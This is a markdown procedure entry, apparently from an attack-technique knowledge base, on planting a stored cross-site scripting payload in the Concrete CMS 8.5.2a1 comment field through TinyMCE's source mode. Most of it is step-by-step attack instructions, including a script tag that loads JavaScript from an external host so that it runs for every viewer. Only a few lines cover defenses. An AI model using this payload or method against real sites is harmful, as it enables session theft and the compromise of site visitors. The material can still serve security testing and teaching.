---
id: proc-insert-xss-payload
tags:
  - xss
  - payload
  - javascript
  - concrete-cms
type: procedure
tools:
  - '[[tools/TinyMCE-Editor]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/insert-stored-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:53.589Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Insert Malicious Script Payload in Comment

## Summary

This procedure switches to Source mode in the TinyMCE Rich Text editor and inserts a malicious <script> tag payload into the blog comment field, exploiting the lack of sanitization to store executable JavaScript in the database.

## Description

With Rich Text enabled, TinyMCE allows raw HTML input. The payload loads an external script from a controlled domain, which executes upon rendering. This Stored XSS persists for all viewers. Target: Concrete CMS 8.5.2a1 comment field.

## Requirements

1. Rich Text editor configured and comment form open
2. Control over an external JS host (e.g., bl4de.tech)
3. Web browser with developer tools

## Defense

Defensive measures and detection strategies:

- Sanitize HTML input server-side (e.g., strip <script> tags)
- Use allowlist for HTML elements in comments
- Scan for external script sources in WAF

## Objectives

1. Inject unsanitized script into comment
2. Load external JS for arbitrary execution
3. Achieve persistence in database

## Instructions

### Step 1: Switch to Source Mode

**Context**: Enable raw HTML editing in the editor.

No command; UI action:

- Click the "Source" button in TinyMCE
- Clear any default text

> Expected: HTML source view opens.

### Step 2: Insert Payload

**Context**: Add the malicious script tag to load external JS.

**Command** ([[commands/insert-stored-xss-payload]]):

```html
<script src="http://bl4de.tech/poc.js"></script>
```

> This inserts the payload; expected: No errors, HTML accepted as-is. The script will load poc.js, which logs execution context.

### Step 3: Switch Back and Preview

**Context**: Return to visual mode to ensure no visible issues.

Click "Source" again to exit:

- Verify payload remains in source

> Expected: Comment field shows empty or placeholder, but source contains script.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/insert-stored-xss-payload]]

## Tools Used

- [[tools/TinyMCE-Editor]]

## Tags

- [[xss]]
- [[payload]]
